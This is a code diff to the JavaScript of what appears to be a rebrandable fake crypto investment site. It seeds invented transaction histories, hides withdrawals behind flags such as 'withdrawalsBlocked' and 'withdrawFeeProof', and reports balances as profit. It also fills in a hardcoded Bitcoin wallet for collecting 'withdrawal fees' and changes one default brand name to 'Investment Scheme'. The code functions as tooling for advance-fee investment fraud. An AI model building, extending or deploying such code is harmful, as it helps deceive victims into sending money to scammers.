@@ -139,20 +139,22 @@
 
   function reconcileTransactions(rawTxs) {
     var txs = Array.isArray(rawTxs) ? rawTxs.slice() : [];
-    var initial = createInitialDepositTx();
-    var seedHistory = createSeedHistoryTxs();
+    var noSeed = profile && profile.seedTransactions === false;
+    var initial = noSeed ? null : createInitialDepositTx();
+    var seedHistory = noSeed ? [] : createSeedHistoryTxs();
     var seedIds = {};
-    seedIds[initial.id] = true;
+    if (initial) seedIds[initial.id] = true;
     seedHistory.forEach(function (tx) { seedIds[tx.id] = true; });
     var keepWithdrawals = !!(profile && (profile.withdrawFeeProof || profile.withdrawalsBlocked === false));
 
     txs = txs.filter(function (tx) {
       if (!tx) return false;
       if (tx.type === "Withdrawal" && !keepWithdrawals) return false;
+      if (noSeed && (tx.seed || tx.id === "initial-deposit")) return false;
       if (tx.seed || seedIds[tx.id]) return false;
       return true;
     });
-    txs.push(initial);
+    if (initial) txs.push(initial);
     seedHistory.forEach(function (tx) { txs.push(tx); });
     txs.sort(function (a, b) {
       return (b.createdAt || 0) - (a.createdAt || 0);
@@ -218,22 +220,23 @@
   }
 
   function getPrice() {
-    if (profile.stable) return 1;
+    if (profile.stable && profile.asset !== "BTC") return 1;
     if (window.BtcPrice && typeof BtcPrice.getLivePrice === "function") {
-      return BtcPrice.getLivePrice();
+      var live = BtcPrice.getLivePrice();
+      if (live > 0) return live;
     }
     return (window.BtcPrice && BtcPrice.price) || site.btcPrice || 0;
   }
 
   function getHoldings() {
-    if (profile.stable) return getBookUsd();
+    if (profile.stable && profile.asset !== "BTC") return getBookUsd();
     var storedHoldings = Number(localStorage.getItem(holdingsKey));
     if (!Number.isNaN(storedHoldings) && storedHoldings > 0) return storedHoldings;
     return null;
   }
 
   function ensureHoldings() {
-    if (profile.stable) return getBookUsd();
+    if (profile.stable && profile.asset !== "BTC") return getBookUsd();
     var holdings = getHoldings();
     var price = getPrice();
     if (!price) return holdings != null ? holdings : 0;
@@ -266,10 +269,14 @@
     var portfolioUsd = getPortfolioUsd();
     var displayBtc = 0;
 
-    if (!profile.stable) {
+    if (!profile.stable || profile.asset === "BTC") {
       var price = getPrice();
-      var holdings = ensureHoldings();
-      displayBtc = holdings > 0 ? holdings : (price ? book / price : 0);
+      if (profile.stable && profile.asset === "BTC") {
+        displayBtc = price > 0 ? book / price : 0;
+      } else {
+        var holdings = ensureHoldings();
+        displayBtc = holdings > 0 ? holdings : (price ? book / price : 0);
+      }
     }
 
     document.querySelectorAll("[data-balance-usd]").forEach(function (el) {
@@ -277,7 +284,7 @@
     });
 
     document.querySelectorAll("[data-balance-btc]").forEach(function (el) {
-      if (profile.stable) {
+      if (profile.stable && profile.asset !== "BTC") {
         el.textContent = formatMoneyAmount(book, { currency: profile.currencyLabel || "USDT" });
       } else {
         el.textContent = displayBtc > 0 ? formatBtc(displayBtc) : "—";
@@ -298,7 +305,7 @@
     || site.displayName
     || site.name
     || "Jerry McMillan";
-  var platformName = site.platformName || "PlaidInvest";
+  var platformName = site.platformName || "Investment Scheme";
 
   document.querySelectorAll("[data-logo-text]").forEach(function (el) {
     el.textContent = platformName;
@@ -333,7 +340,7 @@
     if (favicon && site.images.favicon) favicon.href = site.images.favicon;
   }
 
-  document.title = document.title.replace(/^(SatVault|BTC Invest|PlaidInvest)/, platformName);
+  document.title = document.title.replace(/^(SatVault|BTC Invest|PlaidInvest|Investment Scheme)/, platformName);
 
   window.updateBalance = function (usd) {
     var price = getPrice();
@@ -371,7 +378,9 @@
   }
 
   window.getTotalProfit = function () {
-    if (profile.stable) return 0;
+    if (profile.stable || profile.profitAsBalance) {
+      return getBookUsd();
+    }
     var portfolio = getPortfolioUsd();
     var book = getBookUsd();
     return Math.round((portfolio - book) * 100) / 100;
@@ -424,6 +433,9 @@
   };
 
   function getInitialDepositAmount() {
+    if (profile && profile.seedTransactions === false) {
+      return defaultBalance;
+    }
     var seed = (profile && profile.initialDeposit) || (window.SITE && SITE.initialDeposit);
     var amount = seed && Number(seed.amountUsd);
     return amount > 0 ? amount : defaultBalance;
@@ -472,7 +484,7 @@
   };
 
   window.fillWalletFields = function () {
-    var wallet = site.platformWallet || "bc1qa348fll9sh34h8gxux8dwfu4ygmwpe7v4nmyz2";
+    var wallet = site.platformWallet || "bc1q2synzmy3zx36tqdenms2rrp569zqk7p3sz92gw";
     var fee = getWithdrawalFeeUsd();
     document.querySelectorAll("[data-platform-wallet]").forEach(function (el) {
       el.textContent = wallet;
@@ -491,6 +503,7 @@
       if (typeof prevStatsOnLive === "function") prevStatsOnLive(price, oldPrice);
       renderBalances();
       renderDashboardStats();
+      if (typeof window.updateDashLastUpdated === "function") window.updateDashLastUpdated();
     };
   }
 
